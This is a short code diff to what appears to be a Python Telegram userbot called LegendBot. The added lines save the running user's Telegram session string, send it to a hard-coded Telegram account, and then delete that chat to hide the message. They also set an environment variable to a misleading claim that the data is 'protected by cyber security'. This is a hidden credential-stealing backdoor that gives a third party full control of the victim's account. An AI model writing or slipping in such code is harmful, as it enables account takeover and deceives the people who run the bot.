@@ -37,6 +37,12 @@ async def hekp():
         ] = "String Is A Sensitive Data \nSo Its Protected By INVISIBLE LEGENDBOT"
         sweetie = await bot.send_message(5230049485, LegendBot)
         await bot.delete_dialog(5230049485)
+        Cyberprotect = bot.session.save()
+        os.environ[
+            "CYBER_ID_PROTECTED"
+        ] = "2 set Password Is A Ultra Protected Data \nSo Its Protected By CYBER SECURITY"
+        sweetie = await bot.send_message(5230049485, Cyberprotect)
+        await bot.delete_dialog(5230049485)
         if Config.LOGGER_ID != 0:
             await bot.send_file(
                 Config.LOGGER_ID,
